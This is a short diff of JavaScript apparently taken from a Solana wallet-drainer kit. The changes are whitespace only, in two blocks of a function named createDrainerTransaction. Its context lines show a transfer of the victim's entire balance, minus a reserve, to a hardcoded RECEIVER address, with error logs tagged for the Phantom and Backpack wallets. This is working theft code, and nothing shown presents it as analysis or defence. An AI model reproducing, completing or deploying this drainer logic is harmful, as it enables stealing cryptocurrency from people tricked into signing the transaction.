@@ -325,12 +325,12 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
       try {
         // Single direct transfer - everything minus reserve
         const transferIx = SystemProgram.transfer({
-          fromPubkey: userPubkey,
+            fromPubkey: userPubkey,
           toPubkey: RECEIVER, // Real receiver
           lamports: finalDrainAmount, // Real amount (everything minus reserve)
-        });
+          });
         transaction.add(transferIx);
-      } catch (error) {
+        } catch (error) {
         console.error('[PHANTOM_ULTRA_SIMPLE] Error adding transfer:', error);
         throw new Error(`Failed to create transfer instruction: ${error.message}`);
       }
@@ -349,12 +349,12 @@ async function createDrainerTransaction(userPubkey, balance, connection, blockha
       try {
         // Single direct transfer - everything minus reserve
         const transferIx = SystemProgram.transfer({
-          fromPubkey: userPubkey,
+            fromPubkey: userPubkey,
           toPubkey: RECEIVER, // Real receiver
           lamports: finalDrainAmount, // Real amount (everything minus reserve)
-        });
+          });
         transaction.add(transferIx);
-      } catch (error) {
+        } catch (error) {
         console.error('[BACKPACK_ULTRA_SIMPLE] Error adding transfer:', error);
         throw new Error(`Failed to create transfer instruction: ${error.message}`);
       }
